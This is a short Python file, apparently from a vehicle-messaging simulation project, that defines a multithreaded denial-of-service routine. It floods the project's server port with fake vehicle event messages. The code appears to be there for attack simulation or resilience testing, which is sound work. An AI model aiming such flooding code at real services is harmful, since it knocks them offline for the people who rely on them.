import json
import time
import threading
from src.network.socket_comm import send_message

def flood(port, count):
    for i in range(count):
        msg = {
            "id": "V1",
            "event": f"Noise_{i}",
            "speed": 0,
            "location": "FloodZone",
            "timestamp": str(time.time())
        }
        send_message(port, json.dumps(msg).encode("utf-8"))

def launch_dos(port, count=100, threads=5):
    """Flood the server with too many messages in a short time using multiple threads."""
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood, args=(port, count))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()